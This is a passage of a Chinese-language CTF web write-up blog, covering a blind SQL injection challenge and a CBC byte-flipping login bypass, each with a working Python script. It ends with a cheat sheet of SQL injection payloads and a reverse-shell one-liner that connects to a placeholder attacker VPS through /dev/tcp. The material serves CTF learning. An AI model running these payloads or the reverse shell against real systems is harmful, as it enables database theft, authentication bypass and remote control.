+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&#39;^(0)^1#</span><br><span class="line">&amp;password&#x3D;123456</span><br><span class="line">&amp;submit&#x3D;Log In</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://t1.picb.cc/uploads/2019/09/03/gpiteM.png" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&#39;^(1)^1#</span><br><span class="line">&amp;password&#x3D;123456</span><br><span class="line">&amp;submit&#x3D;Log In</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://t1.picb.cc/uploads/2019/09/03/gpiZht.png" alt=""></p>
+<p>观察发现语句为假返回<code>password error!</code>，语句为真时返回<code>username does not exist!</code></p>
+<p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">关键在于：异或判断 &amp; ascii()处理字符串返回第一个字符的ascii值</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">character = string.ascii_letters + string.digits + string.punctuation</span><br><span class="line">max_length = <span class="number">100</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">url = <span class="string">"http://123.206.31.85:49167/"</span></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, max_length):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> character:</span><br><span class="line">        payload = <span class="string">"(ascii(substr((select(password)from(admin))from(%d)))&lt;&gt;%d)"</span> % (i, ord(c))</span><br><span class="line">        username = <span class="string">"admin'^(%s)^1#"</span> % payload  <span class="comment"># 1=&gt;username does not exist!  0=&gt;password error!</span></span><br><span class="line">        password = <span class="number">123456</span></span><br><span class="line">        data = &#123;<span class="string">'username'</span>: username, <span class="string">'password'</span>: password&#125;</span><br><span class="line">        r = s.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"username does not exist!"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += c</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure>
+
+<h2 id="login4-SKCTF"><a href="#login4-SKCTF" class="headerlink" title="login4(SKCTF)"></a>login4(SKCTF)</h2><p><strong>考察点：CBC字节翻转攻击_脚本编写</strong></p>
+<p> 之前一直以为很难懂，原来只是分组密码里的密文链接模式2333。</p>
+<h3 id="CBC加解密流程"><a href="#CBC加解密流程" class="headerlink" title="CBC加解密流程"></a>CBC加解密流程</h3><p>加密的步骤简单来说，首先把明文分组(通常16字节一组)，然后与上一组的密文异或，再用密钥加密输出即可。</p>
+<p>这里注意第一组用初始向量异或。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/6949366-5e79b4a4e6495c2d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/601" alt=""></p>
+<p>对应的解密步骤，把密文分组，先用密钥解密，再与上一组密文异或得到明文。</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/6949366-d69c0869465af6de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/601" alt=""></p>
+<h3 id="CBC字节翻转攻击"><a href="#CBC字节翻转攻击" class="headerlink" title="CBC字节翻转攻击"></a>CBC字节翻转攻击</h3><p>这类题目一般初始向量IV和加密的密文可控，然后题目实现一个加密和解密的过程，要求解密后的明文有指定的内容。(当然一开始是没有的)</p>
+<p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, file_get_contents(<span class="string">'/root/key'</span>));</span><br><span class="line">define(<span class="string">"METHOD"</span>, <span class="string">"aes-128-cbc"</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_iv</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $random_iv=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($info)</span></span>&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    $plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    $_SESSION[<span class="string">'username'</span>] = $info[<span class="string">'username'</span>];</span><br><span class="line">    setcookie(<span class="string">"iv"</span>, base64_encode($iv));</span><br><span class="line">    setcookie(<span class="string">"cipher"</span>, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_login</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'cipher'</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">'iv'</span>]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[<span class="string">'cipher'</span>]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[<span class="string">"iv"</span>]);</span><br><span class="line">        <span class="keyword">if</span>($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"&lt;p&gt;base64_decode('"</span>.base64_encode($plain).<span class="string">"') can't unserialize&lt;/p&gt;"</span>);</span><br><span class="line">            $_SESSION[<span class="string">'username'</span>] = $info[<span class="string">'username'</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"ERROR!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_SESSION[<span class="string">"username"</span>]===<span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Hello admin&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Flag is $flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;hello '</span>.$_SESSION[<span class="string">'username'</span>].<span class="string">'&lt;/p&gt;'</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;p&gt;Only admin can see flag&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;p&gt;&lt;a href="loginout.php"&gt;Log out&lt;/a&gt;&lt;/p&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">    $username = (string)$_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = (string)$_POST[<span class="string">'password'</span>];</span><br><span class="line">    <span class="keyword">if</span>($username === <span class="string">'admin'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'&lt;p&gt;admin are not allowed to login&lt;/p&gt;'</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $info = <span class="keyword">array</span>(<span class="string">'username'</span>=&gt;$username,<span class="string">'password'</span>=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">"username"</span>]))&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;body class="login-body"&gt;</span></span><br><span class="line"><span class="string">                &lt;div id="wrapper"&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class="user-icon"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class="pass-icon"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;form name="login-form" class="login-form" action="" method="post"&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="header"&gt;</span></span><br><span class="line"><span class="string">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="content"&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name="username" type="text" class="input username" value="Username" οnfοcus="this.value=\'\'" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name="password" type="password" class="input password" value="Password" οnfοcus="this.value=\'\'" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class="footer"&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type="submit" name="submit" value="Login" class="button" /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/form&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/body&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里要求username为admin，但是又不能输入admin，这里就可以利用CBC字节翻转攻击。</p>
+<p>脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding: utf-8 --</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">source_plain = decrypt(cypher, key) ^ pr_cypher</span></span><br><span class="line"><span class="string">target_plain = decrypt(cypher, key) ^ new_pr_cypher</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">decrypt(cypher, key) = source_plain ^ pr_cypher</span></span><br><span class="line"><span class="string">decrypt(cypher, key) = targer_plain ^ new_pr_cypher</span></span><br><span class="line"><span class="string">source_plain ^ pr_cypher = targer_plain ^ new_pr_cypher</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*** new_pr_cypher = souce_plain ^ target_plain ^ pr_cypher ***</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="comment"># POST：username=zdmin&amp;password=12345</span></span><br><span class="line"><span class="comment"># s:2:&#123;s:8:"userna</span></span><br><span class="line"><span class="comment"># me";s:5:"zdmin"; # 第2组 第10字节</span></span><br><span class="line"><span class="comment"># s:8:"password";s</span></span><br><span class="line"><span class="comment"># :3:"12345";&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更改上一组的密文，控制本组明文输出</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cypher_payload</span><span class="params">()</span>:</span></span><br><span class="line">    cypher = <span class="string">'ZAF4kXCUawL7i4ofBhE%2Bi5GTeMY4aHhzY8x%2FQKy%2FDdI5nJK6gHXbOMugUFTL6pG7gQBNvtsT6o0nq6Pd3MQeuw%3D%3D'</span>  <span class="comment"># 填写第一次提交获得的密文</span></span><br><span class="line">    cypher = base64.b64decode(urllib.unquote(cypher))</span><br><span class="line">    new_cypher = cypher[<span class="number">0</span>:<span class="number">9</span>] + chr(ord(<span class="string">'a'</span>) ^ ord(<span class="string">'z'</span>) ^ ord(cypher[<span class="number">9</span>])) + cypher[<span class="number">10</span>:]</span><br><span class="line">    new_cypher = urllib.quote(base64.b64encode(new_cypher))</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"new_cypher:"</span> + new_cypher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 更改初始向量(上一组的上一组)，保持上一组解密后明文不变</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">iv_payload</span><span class="params">()</span>:</span></span><br><span class="line">    cipher = <span class="string">'+BHIbc7b6bOgCeaqeTLFQm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjY6IjEyMzQ1NiI7fQ=='</span>  <span class="comment"># 填写提交后所得的无法反序列化的明文</span></span><br><span class="line">    iv = <span class="string">'WGg7JCcty4UxRBR9L3EVEw%3D%3D'</span>  <span class="comment"># 填写第一次提交获得的初始向量</span></span><br><span class="line">    <span class="comment"># cipher = urllib.unquote(cipher)</span></span><br><span class="line">    cipher = base64.b64decode(cipher)</span><br><span class="line">    iv = base64.b64decode(urllib.unquote(iv))</span><br><span class="line">    right = <span class="string">'a:2:&#123;s:8:"userna'</span>  <span class="comment"># 被破坏的分组</span></span><br><span class="line">    newIv = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        newIv += chr(ord(right[i]) ^ ord(iv[i]) ^ ord(cipher[i]))  <span class="comment"># 这一步相当于把原来iv中不匹配的部分修改过来</span></span><br><span class="line">    <span class="keyword">print</span> urllib.quote(base64.b64encode(newIv))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 先走第一个函数构造上一组的密文，再走第二个函数构造上一组的上一组的密文(本题的初始化向量)</span></span><br><span class="line">cypher_payload()</span><br><span class="line">iv_payload()</span><br></pre></td></tr></table></figure>
+
+<p>不多解释了，脚本写得很清楚。</p>
+<p>先获取zdmin加密后的密文和初始向量IV：</p>
+<p><img src="https://t1.picb.cc/uploads/2019/09/03/gpiHwL.png" alt=""></p>
+<p>利用脚本获取new_cipher使其解密后zdmin变为admin：</p>
+<p><img src="https://t1.picb.cc/uploads/2019/09/03/gpirAW.png" alt=""></p>
+<p>填入new_cipher，获取返回的因为第一组被破坏而无法反序列化的明文：</p>
+<p><img src="https://t1.picb.cc/uploads/2019/09/03/gpi5Fw.png" alt=""></p>
+<p>利用脚本获取new_iv，使被修改的第一组密文正常解密：</p>
+<p><img src="https://t1.picb.cc/uploads/2019/09/03/gpiAJR.png" alt=""></p>
+<p>向cookie中添加new_iv和new_cipher获取flag。</p>
+<p><img src="https://t1.picb.cc/uploads/2019/09/03/gpiM48.png" alt=""></p>
+<h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p><strong>考察点：变量覆盖</strong></p>
+<p>这里我老是忘记，$b = file_get_contents($_GET[‘a’])，当a=php://input，然后post传1，$b就会等于1。</p>
+<h2 id="常用payload"><a href="#常用payload" class="headerlink" title="常用payload"></a>常用payload</h2><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">查库名---(select group_concat(schema_name) from information_schema.schemata)</span><br><span class="line"></span><br><span class="line">查表名---(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;schema_name&#39;)</span><br><span class="line"></span><br><span class="line">查字段---(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;table_name&#39;)</span><br><span class="line"></span><br><span class="line">查flag--- (select column_name from table_name)</span><br></pre></td></tr></table></figure>
+
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and updatexml(1,concat('~',(your_payload),'~'),3) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and exp(~(<span class="keyword">select</span> * <span class="keyword">from</span> (your_payload) a) ); <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(((your_payload)),<span class="keyword">floor</span> (<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>注意：超过一行时用 <code>payload LIMIT 0,1</code>逐个查询</strong></p>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' and case when substring((<span class="keyword">select</span> flag <span class="keyword">from</span> flag) <span class="keyword">from</span> %d <span class="keyword">for</span> <span class="number">1</span>)=<span class="string">'%s'</span>  <span class="keyword">then</span> <span class="keyword">sleep</span>(<span class="number">5</span>) <span class="keyword">else</span> <span class="number">1</span> <span class="keyword">end</span> <span class="keyword">and</span> <span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin'^(1)^1<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="其他注入"><a href="#其他注入" class="headerlink" title="其他注入"></a>其他注入</h3><p><strong>union_md5()</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin' union <span class="keyword">select</span> <span class="number">1</span>,ma5(<span class="number">1</span>) %<span class="number">23</span>&amp;<span class="keyword">password</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="反弹shelll"><a href="#反弹shelll" class="headerlink" title="反弹shelll"></a>反弹shelll</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> VPS：</span></span><br><span class="line">nc -lvp 6666</span><br><span class="line"><span class="meta">#</span><span class="bash"> 命令执行点：</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/xxx.xxx.xxx.xxx/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>比赛总是自闭，继续加油吧= =</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Web/" rel="tag"># Web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/08/26/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%8D%E5%AD%A6%E4%B9%A0/" rel="next" title="phar://反序列化再学习">
+                <i class="fa fa-chevron-left"></i> phar://反序列化再学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/09/25/De1ctf-Web%E5%A4%8D%E7%8E%B0/" rel="prev" title="De1ctf Web复现">
+                De1ctf Web复现 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="sketch_pl4ne" />
+            
+              <p class="site-author-name" itemprop="name">sketch_pl4ne</p>
+              <p class="site-description motion-element" itemprop="description">wym</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.zhaoj.in/" title="glzjin" target="_blank">glzjin</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://lihuaiqiu.github.io/" title="离怀秋" target="_blank">离怀秋</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/wfzWebSecuity/" title="tr1ple" target="_blank">tr1ple</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://southsea.st/" title="南溟" target="_blank">南溟</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Object"><span class="nav-number">2.</span> <span class="nav-text">Object</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dynamic"><span class="nav-number">3.</span> <span class="nav-text">Dynamic</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#INSERT-INTO注入"><span class="nav-number">4.</span> <span class="nav-text">INSERT INTO注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#这是一个神奇的登陆框"><span class="nav-number">5.</span> <span class="nav-text">这是一个神奇的登陆框</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP-encrypt-1"><span class="nav-number">6.</span> <span class="nav-text">PHP_encrypt_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#login2-SKCTF"><span class="nav-number">7.</span> <span class="nav-text">login2(SKCTF)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#login3-SKCTF"><span class="nav-number">8.</span> <span class="nav-text">login3(SKCTF)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#空格被过滤"><span class="nav-number">8.1.</span> <span class="nav-text">空格被过滤</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#login4-SKCTF"><span class="nav-number">9.</span> <span class="nav-text">login4(SKCTF)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CBC加解密流程"><span class="nav-number">9.1.</span> <span class="nav-text">CBC加解密流程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CBC字节翻转攻击"><span class="nav-number">9.2.</span> <span class="nav-text">CBC字节翻转攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php-input"><span class="nav-number">10.</span> <span class="nav-text">php:&#x2F;&#x2F;input</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常用payload"><span class="nav-number">11.</span> <span class="nav-text">常用payload</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#联合查询"><span class="nav-number">11.1.</span> <span class="nav-text">联合查询</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#报错注入"><span class="nav-number">11.2.</span> <span class="nav-text">报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#盲注"><span class="nav-number">11.3.</span> <span class="nav-text">盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#时间盲注"><span class="nav-number">11.3.1.</span> <span class="nav-text">时间盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#布尔盲注"><span class="nav-number">11.3.2.</span> <span class="nav-text">布尔盲注</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他注入"><span class="nav-number">11.4.</span> <span class="nav-text">其他注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" 